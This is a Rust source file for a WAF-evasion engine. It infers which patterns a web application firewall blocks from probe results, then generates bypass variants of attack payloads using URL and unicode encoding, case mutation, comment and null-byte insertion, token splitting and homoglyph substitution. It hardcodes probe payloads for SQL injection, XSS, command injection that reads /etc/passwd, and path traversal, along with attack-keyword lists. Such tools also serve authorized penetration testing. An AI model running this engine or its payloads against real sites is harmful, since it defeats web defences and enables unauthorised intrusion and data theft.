use std::collections::{HashMap, HashSet};
use std::fmt;

use serde::{Deserialize, Serialize};

/// A single WAF rule recovered from probing.
///
/// Each rule represents a pattern the WAF matches against incoming requests.
/// Confidence reflects how many confirming probes contributed to inference —
/// a rule with confidence < 0.5 should be treated as speculative.
/// Invariant: `blocked_samples` is never empty for a valid inferred rule.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InferredWafRule {
    pub pattern: String,
    pub confidence: f64,
    pub blocked_samples: Vec<String>,
    pub allowed_samples: Vec<String>,
    pub boundary_chars: Vec<char>,
}

/// The complete grammar model of a WAF's rule set.
///
/// Built incrementally from probe results. `probe_count` tracks total probes
/// consumed to build this model. `false_positive_rate` is estimated from
/// probes that were blocked unexpectedly (no matching rule pattern).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WafGrammar {
    pub rules: Vec<InferredWafRule>,
    pub probe_count: usize,
    pub false_positive_rate: f64,
}

/// Result of sending a single probe payload to the target.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProbeResult {
    pub payload: String,
    pub blocked: bool,
    pub status_code: Option<u16>,
    pub strategy: ProbeStrategy,
}

/// Probe strategies for inferring WAF rules.
///
/// Each strategy targets a different dimension of WAF behavior,
/// enabling triangulation of rule boundaries.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum ProbeStrategy {
    BinarySearch,
    CharSubstitution,
    EncodingLadder,
    CaseMutation,
    NullByteInsertion,
    WhitespaceProbing,
    CommentInjection,
    TokenSplitting,
}

impl fmt::Display for ProbeStrategy {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::BinarySearch => write!(f, "binary-search"),
            Self::CharSubstitution => write!(f, "char-substitution"),
            Self::EncodingLadder => write!(f, "encoding-ladder"),
            Self::CaseMutation => write!(f, "case-mutation"),
            Self::NullByteInsertion => write!(f, "null-byte-insertion"),
            Self::WhitespaceProbing => write!(f, "whitespace-probing"),
            Self::CommentInjection => write!(f, "comment-injection"),
            Self::TokenSplitting => write!(f, "token-splitting"),
        }
    }
}

/// Configuration for the grammar inference engine.
#[derive(Debug, Clone)]
pub struct InferenceConfig {
    pub min_confidence: f64,
    pub max_probes: usize,
    pub dedup_threshold: f64,
}

impl Default for InferenceConfig {
    fn default() -> Self {
        Self {
            min_confidence: 0.3,
            max_probes: 500,
            dedup_threshold: 0.8,
        }
    }
}

impl InferenceConfig {
    pub fn with_min_confidence(mut self, c: f64) -> Self {
        self.min_confidence = c.clamp(0.0, 1.0);
        self
    }

    pub fn with_max_probes(mut self, n: usize) -> Self {
        self.max_probes = n;
        self
    }

    pub fn with_dedup_threshold(mut self, t: f64) -> Self {
        self.dedup_threshold = t.clamp(0.0, 1.0);
        self
    }
}

/// Adaptive WAF Grammar Inference Engine.
///
/// Consumes probe results and reverse-engineers WAF rule grammars.
/// The engine is backend-agnostic: callers send probes through whatever
/// HTTP transport they use, then feed `ProbeResult`s back here.
///
/// Contract: call `infer_grammar` with a batch of probe results.
/// The engine clusters blocked payloads, extracts common patterns,
/// estimates boundaries, and returns a `WafGrammar` model.
pub struct WafGrammarInference {
    config: InferenceConfig,
}

impl WafGrammarInference {
    pub fn new() -> Self {
        Self {
            config: InferenceConfig::default(),
        }
    }

    pub fn with_config(mut self, config: InferenceConfig) -> Self {
        self.config = config;
        self
    }

    /// Infers a WAF grammar model from a set of probe results.
    ///
    /// Clusters blocked probes by shared substrings, extracts regex-like
    /// patterns, computes confidence from confirmation count, and estimates
    /// false positive rate from unmatched blocks.
    pub fn infer_grammar(&self, probes: &[ProbeResult]) -> WafGrammar {
        if probes.is_empty() {
            return WafGrammar {
                rules: Vec::new(),
                probe_count: 0,
                false_positive_rate: 0.0,
            };
        }

        let blocked: Vec<&ProbeResult> = probes.iter().filter(|p| p.blocked).collect();
        let allowed: Vec<&ProbeResult> = probes.iter().filter(|p| !p.blocked).collect();

        let clusters = cluster_blocked_payloads(&blocked);
        let mut rules = Vec::new();

        for (pattern, members) in &clusters {
            let blocked_samples: Vec<String> = members.iter().map(|p| p.payload.clone()).collect();
            let allowed_samples = find_allowed_near_pattern(&allowed, pattern);
            let boundary_chars = extract_boundary_chars(&blocked_samples, &allowed_samples);
            let confidence = compute_rule_confidence(members.len(), probes.len());

            if confidence >= self.config.min_confidence {
                rules.push(InferredWafRule {
                    pattern: pattern.clone(),
                    confidence,
                    blocked_samples,
                    allowed_samples,
                    boundary_chars,
                });
            }
        }

        rules = dedup_rules(rules, self.config.dedup_threshold);
        rules.sort_by(|a, b| {
            b.confidence
                .partial_cmp(&a.confidence)
                .unwrap_or(std::cmp::Ordering::Equal)
        });

        let matched_blocks: usize = rules.iter().map(|r| r.blocked_samples.len()).sum();
        let fp_rate = if blocked.is_empty() {
            0.0
        } else {
            let unmatched = blocked.len().saturating_sub(matched_blocks);
            unmatched as f64 / blocked.len() as f64
        };

        WafGrammar {
            rules,
            probe_count: probes.len(),
            false_positive_rate: fp_rate,
        }
    }

    /// Generates bypass payloads for a given input payload based on the grammar model.
    ///
    /// For each rule that would block the payload, applies evasion transforms:
    /// encoding, case mutation, whitespace insertion, comment injection, null bytes,
    /// and token splitting. Returns deduplicated candidates.
    pub fn generate_bypass(&self, grammar: &WafGrammar, payload: &str) -> Vec<String> {
        let matching_rules: Vec<&InferredWafRule> = grammar
            .rules
            .iter()
            .filter(|r| payload_matches_rule(payload, r))
            .collect();

        if matching_rules.is_empty() {
            return vec![payload.to_string()];
        }

        let mut bypasses: Vec<String> = Vec::new();

        for rule in &matching_rules {
            bypasses.extend(apply_encoding_ladder(payload, &rule.pattern));
            bypasses.extend(apply_case_mutations(payload, &rule.pattern));
            bypasses.extend(apply_whitespace_insertion(payload, &rule.pattern));
            bypasses.extend(apply_comment_injection(payload, &rule.pattern));
            bypasses.extend(apply_null_byte_insertion(payload, &rule.pattern));
            bypasses.extend(apply_token_splitting(payload, &rule.pattern));
            bypasses.extend(apply_char_substitution(payload, &rule.boundary_chars));
        }

        dedup_strings(bypasses)
    }

    /// Suggests the next probes to send based on the current grammar model.
    ///
    /// Focuses on areas of uncertainty: rules with low confidence get
    /// confirmation probes, gaps between rules get exploration probes.
    pub fn suggest_next_probe(&self, grammar: &WafGrammar) -> Vec<String> {
        let mut suggestions: Vec<String> = Vec::new();

        for rule in &grammar.rules {
            if rule.confidence < 0.7 {
                suggestions.extend(generate_confirmation_probes(
                    &rule.pattern,
                    &rule.boundary_chars,
                ));
            }
            suggestions.extend(generate_boundary_probes(
                &rule.pattern,
                &rule.boundary_chars,
            ));
        }

        suggestions.extend(generate_exploration_probes(grammar));
        dedup_strings(suggestions)
    }
}

impl Default for WafGrammarInference {
    fn default() -> Self {
        Self::new()
    }
}

fn cluster_blocked_payloads<'a>(
    blocked: &[&'a ProbeResult],
) -> Vec<(String, Vec<&'a ProbeResult>)> {
    if blocked.is_empty() {
        return Vec::new();
    }

    let mut pattern_map: HashMap<String, Vec<&'a ProbeResult>> = HashMap::new();

    for probe in blocked {
        let pattern = extract_trigger_pattern(&probe.payload);
        pattern_map.entry(pattern).or_default().push(probe);
    }

    let mut clusters: Vec<(String, Vec<&ProbeResult>)> = pattern_map.into_iter().collect();
    clusters.sort_by(|a, b| b.1.len().cmp(&a.1.len()));
    clusters
}

fn extract_trigger_pattern(payload: &str) -> String {
    let sql_keywords = [
        "select",
        "union",
        "insert",
        "update",
        "delete",
        "drop",
        "exec",
        "declare",
        "cast",
        "convert",
        "waitfor",
        "benchmark",
        "sleep",
        "or 1=1",
        "' or",
        "\" or",
        "and 1=1",
        "' and",
    ];
    let xss_markers = [
        "<script",
        "onerror",
        "onload",
        "javascript:",
        "alert(",
        "eval(",
    ];
    let cmd_markers = ["; ", "| ", "` ", "$( ", "&&"];
    let path_markers = ["../", "..\\", "%2e%2e", "/etc/", "\\windows\\"];

    let lower = payload.to_lowercase();

    for kw in &sql_keywords {
        if lower.contains(kw) {
            return format!("sqli:{kw}");
        }
    }
    for marker in &xss_markers {
        if lower.contains(marker) {
            return format!("xss:{marker}");
        }
    }
    for marker in &cmd_markers {
        if payload.contains(marker) {
            return format!("cmdi:{marker}");
        }
    }
    for marker in &path_markers {
        if lower.contains(marker) {
            return format!("path:{marker}");
        }
    }

    if payload.len() > 6 {
        format!("unknown:{}", &payload[..6])
    } else {
        format!("unknown:{payload}")
    }
}

fn find_allowed_near_pattern(allowed: &[&ProbeResult], pattern: &str) -> Vec<String> {
    let category = pattern.split(':').next().unwrap_or("");
    allowed
        .iter()
        .filter(|p| {
            let lower = p.payload.to_lowercase();
            match category {
                "sqli" => lower.contains("select") || lower.contains("from"),
                "xss" => lower.contains('<') || lower.contains('>'),
                "cmdi" => lower.contains(';') || lower.contains('|'),
                "path" => lower.contains("..") || lower.contains('/'),
                _ => false,
            }
        })
        .map(|p| p.payload.clone())
        .collect()
}

fn extract_boundary_chars(blocked: &[String], allowed: &[String]) -> Vec<char> {
    let mut boundary: HashSet<char> = HashSet::new();

    for b in blocked {
        for a in allowed {
            let diff_chars = diff_chars(b, a);
            boundary.extend(diff_chars);
        }
    }

    if boundary.is_empty() {
        for b in blocked {
            for ch in b.chars() {
                if !ch.is_alphanumeric() && !ch.is_whitespace() {
                    boundary.insert(ch);
                }
            }
        }
    }

    let mut sorted: Vec<char> = boundary.into_iter().collect();
    sorted.sort();
    sorted
}

fn diff_chars(a: &str, b: &str) -> Vec<char> {
    let a_chars: HashSet<char> = a.chars().collect();
    let b_chars: HashSet<char> = b.chars().collect();
    a_chars.symmetric_difference(&b_chars).copied().collect()
}

fn compute_rule_confidence(matched_count: usize, total_probes: usize) -> f64 {
    if total_probes == 0 {
        return 0.0;
    }
    let base = (matched_count as f64 / total_probes as f64).sqrt();
    let volume_bonus = (matched_count as f64).ln_1p() / 10.0;
    (base + volume_bonus).clamp(0.0, 1.0)
}

fn dedup_rules(rules: Vec<InferredWafRule>, threshold: f64) -> Vec<InferredWafRule> {
    let mut kept: Vec<InferredWafRule> = Vec::new();

    for rule in rules {
        let dominated = kept.iter().any(|existing| {
            pattern_similarity(&existing.pattern, &rule.pattern) >= threshold
                && existing.confidence >= rule.confidence
        });
        if !dominated {
            kept.push(rule);
        }
    }

    kept
}

fn pattern_similarity(a: &str, b: &str) -> f64 {
    if a == b {
        return 1.0;
    }
    let a_set: HashSet<char> = a.chars().collect();
    let b_set: HashSet<char> = b.chars().collect();
    let intersection = a_set.intersection(&b_set).count() as f64;
    let union = a_set.union(&b_set).count() as f64;
    if union == 0.0 {
        0.0
    } else {
        intersection / union
    }
}

fn payload_matches_rule(payload: &str, rule: &InferredWafRule) -> bool {
    let trigger = rule.pattern.split(':').nth(1).unwrap_or("");
    if trigger.is_empty() {
        return false;
    }
    payload.to_lowercase().contains(&trigger.to_lowercase())
}

fn replace_trigger_ci(payload: &str, trigger: &str, replacement: &str) -> String {
    let lower_payload = payload.to_lowercase();
    let lower_trigger = trigger.to_lowercase();
    if let Some(pos) = lower_payload.find(&lower_trigger) {
        let mut result = String::with_capacity(payload.len() + replacement.len());
        result.push_str(&payload[..pos]);
        result.push_str(replacement);
        result.push_str(&payload[pos + trigger.len()..]);
        result
    } else {
        payload.to_string()
    }
}

fn apply_encoding_ladder(payload: &str, pattern: &str) -> Vec<String> {
    let trigger = pattern.split(':').nth(1).unwrap_or("");
    if trigger.is_empty() {
        return Vec::new();
    }

    let url_encoded = replace_trigger_ci(payload, trigger, &url_encode(trigger));
    let double_encoded = replace_trigger_ci(payload, trigger, &url_encode(&url_encode(trigger)));
    let unicode_encoded = replace_trigger_ci(payload, trigger, &unicode_escape(trigger));
    let hex_encoded = replace_trigger_ci(payload, trigger, &hex_encode(trigger));

    vec![url_encoded, double_encoded, unicode_encoded, hex_encoded]
}

fn apply_case_mutations(payload: &str, pattern: &str) -> Vec<String> {
    let trigger = pattern.split(':').nth(1).unwrap_or("");
    if trigger.is_empty() {
        return Vec::new();
    }

    let results = vec![
        replace_trigger_ci(payload, trigger, &trigger.to_uppercase()),
        replace_trigger_ci(payload, trigger, &alternating_case(trigger)),
        replace_trigger_ci(payload, trigger, &random_case(trigger)),
    ];
    results
}

fn apply_whitespace_insertion(payload: &str, pattern: &str) -> Vec<String> {
    let trigger = pattern.split(':').nth(1).unwrap_or("");
    if trigger.is_empty() {
        return Vec::new();
    }

    let spaces = ["\t", "\x0b", "\x0c", "\u{00a0}", "\u{2003}"];
    spaces
        .iter()
        .map(|ws| {
            if trigger.len() > 1 {
                let mid = trigger.len() / 2;
                replace_trigger_ci(
                    payload,
                    trigger,
                    &format!("{}{ws}{}", &trigger[..mid], &trigger[mid..]),
                )
            } else {
                replace_trigger_ci(payload, trigger, &format!("{ws}{trigger}"))
            }
        })
        .collect()
}

fn apply_comment_injection(payload: &str, pattern: &str) -> Vec<String> {
    let trigger = pattern.split(':').nth(1).unwrap_or("");
    if trigger.is_empty() {
        return Vec::new();
    }

    let category = pattern.split(':').next().unwrap_or("");
    let comments: Vec<&str> = match category {
        "sqli" => vec!["/**/", "/*!*/", "-- -\n", "/**_**/"],
        "xss" => vec!["<!---->", "//\n", "/**/"],
        _ => vec!["/**/", "<!---->"],
    };

    comments
        .iter()
        .filter_map(|comment| {
            if trigger.len() > 1 {
                let mid = trigger.len() / 2;
                Some(replace_trigger_ci(
                    payload,
                    trigger,
                    &format!("{}{comment}{}", &trigger[..mid], &trigger[mid..]),
                ))
            } else {
                None
            }
        })
        .collect()
}

fn apply_null_byte_insertion(payload: &str, pattern: &str) -> Vec<String> {
    let trigger = pattern.split(':').nth(1).unwrap_or("");
    if trigger.is_empty() {
        return Vec::new();
    }

    let nulls = ["%00", "\x00", "%0a", "%0d"];
    nulls
        .iter()
        .filter_map(|null| {
            if trigger.len() > 1 {
                let mid = trigger.len() / 2;
                Some(replace_trigger_ci(
                    payload,
                    trigger,
                    &format!("{}{null}{}", &trigger[..mid], &trigger[mid..]),
                ))
            } else {
                None
            }
        })
        .collect()
}

fn apply_token_splitting(payload: &str, pattern: &str) -> Vec<String> {
    let trigger = pattern.split(':').nth(1).unwrap_or("");
    if trigger.is_empty() || trigger.len() < 2 {
        return Vec::new();
    }

    let mut results = Vec::new();
    let mid = trigger.len() / 2;
    let (left, right) = trigger.split_at(mid);

    results.push(replace_trigger_ci(
        payload,
        trigger,
        &format!("{left}%00{right}"),
    ));
    results.push(replace_trigger_ci(
        payload,
        trigger,
        &format!("{left}\r\n{right}"),
    ));
    results.push(replace_trigger_ci(
        payload,
        trigger,
        &format!("{left}\t{right}"),
    ));

    let chunked = trigger
        .chars()
        .enumerate()
        .map(|(i, c)| {
            if i % 2 == 0 {
                url_encode_char(c)
            } else {
                c.to_string()
            }
        })
        .collect::<String>();
    results.push(replace_trigger_ci(payload, trigger, &chunked));

    results
}

fn apply_char_substitution(payload: &str, boundary_chars: &[char]) -> Vec<String> {
    let homoglyphs: HashMap<char, Vec<char>> = build_homoglyph_map();
    let mut results = Vec::new();

    for &ch in boundary_chars {
        if let Some(replacements) = homoglyphs.get(&ch) {
            for &replacement in replacements {
                results.push(payload.replace(ch, &replacement.to_string()));
            }
        }
    }

    results
}

fn build_homoglyph_map() -> HashMap<char, Vec<char>> {
    let mut m: HashMap<char, Vec<char>> = HashMap::new();
    m.insert('<', vec!['\u{FF1C}', '\u{FE64}', '\u{2039}']);
    m.insert('>', vec!['\u{FF1E}', '\u{FE65}', '\u{203A}']);
    m.insert('\'', vec!['\u{2018}', '\u{2019}', '\u{FF07}']);
    m.insert('"', vec!['\u{201C}', '\u{201D}', '\u{FF02}']);
    m.insert('(', vec!['\u{FF08}', '\u{FE59}']);
    m.insert(')', vec!['\u{FF09}', '\u{FE5A}']);
    m.insert('/', vec!['\u{FF0F}', '\u{2215}', '\u{2044}']);
    m.insert(';', vec!['\u{FF1B}', '\u{037E}']);
    m.insert('=', vec!['\u{FF1D}', '\u{FE66}']);
    m.insert(' ', vec!['\u{00A0}', '\u{2003}', '\u{2002}']);
    m
}

fn generate_confirmation_probes(pattern: &str, boundary_chars: &[char]) -> Vec<String> {
    let trigger = pattern.split(':').nth(1).unwrap_or("");
    let mut probes = Vec::new();

    if !trigger.is_empty() {
        probes.push(trigger.to_string());
        probes.push(trigger.to_uppercase());
        probes.push(format!("x{trigger}x"));
    }

    for &ch in boundary_chars {
        probes.push(format!("{ch}{trigger}"));
        probes.push(format!("{trigger}{ch}"));
    }

    probes
}

fn generate_boundary_probes(pattern: &str, boundary_chars: &[char]) -> Vec<String> {
    let trigger = pattern.split(':').nth(1).unwrap_or("");
    if trigger.is_empty() {
        return Vec::new();
    }

    let mut probes = Vec::new();
    if trigger.len() > 1 {
        probes.push(trigger[..trigger.len() - 1].to_string());
    }
    if trigger.len() > 2 {
        probes.push(trigger[1..].to_string());
    }

    for &ch in boundary_chars.iter().take(3) {
        probes.push(format!("{trigger}{ch}a"));
    }

    probes
}

fn generate_exploration_probes(grammar: &WafGrammar) -> Vec<String> {
    let known_categories: HashSet<&str> = grammar
        .rules
        .iter()
        .filter_map(|r| r.pattern.split(':').next())
        .collect();

    let mut probes = Vec::new();

    if !known_categories.contains("sqli") {
        probes.push("' OR 1=1--".to_string());
        probes.push("UNION SELECT NULL".to_string());
    }
    if !known_categories.contains("xss") {
        probes.push("<script>alert(1)</script>".to_string());
        probes.push("\" onerror=\"alert(1)".to_string());
    }
    if !known_categories.contains("cmdi") {
        probes.push("; cat /etc/passwd".to_string());
        probes.push("| whoami".to_string());
    }
    if !known_categories.contains("path") {
        probes.push("../../etc/passwd".to_string());
        probes.push("..\\..\\windows\\win.ini".to_string());
    }

    probes
}

fn url_encode(s: &str) -> String {
    s.chars().map(url_encode_char).collect()
}

fn url_encode_char(c: char) -> String {
    if c.is_ascii_alphanumeric() {
        c.to_string()
    } else {
        let mut buf = [0u8; 4];
        let encoded = c.encode_utf8(&mut buf);
        encoded.bytes().map(|b| format!("%{b:02X}")).collect()
    }
}

fn unicode_escape(s: &str) -> String {
    s.chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() {
                c.to_string()
            } else {
                format!("\\u{{{:04X}}}", c as u32)
            }
        })
        .collect()
}

fn hex_encode(s: &str) -> String {
    s.chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() {
                c.to_string()
            } else {
                format!("0x{:02X}", c as u32)
            }
        })
        .collect()
}

fn alternating_case(s: &str) -> String {
    s.chars()
        .enumerate()
        .map(|(i, c)| {
            if i % 2 == 0 {
                c.to_uppercase().to_string()
            } else {
                c.to_lowercase().to_string()
            }
        })
        .collect()
}

fn random_case(s: &str) -> String {
    s.chars()
        .enumerate()
        .map(|(i, c)| {
            if (i * 7 + 3) % 4 < 2 {
                c.to_uppercase().to_string()
            } else {
                c.to_lowercase().to_string()
            }
        })
        .collect()
}

fn dedup_strings(mut items: Vec<String>) -> Vec<String> {
    let mut seen = HashSet::new();
    items.retain(|s| seen.insert(s.clone()));
    items
}

#[cfg(test)]
#[path = "waf_grammar_test.rs"]
mod waf_grammar_test;
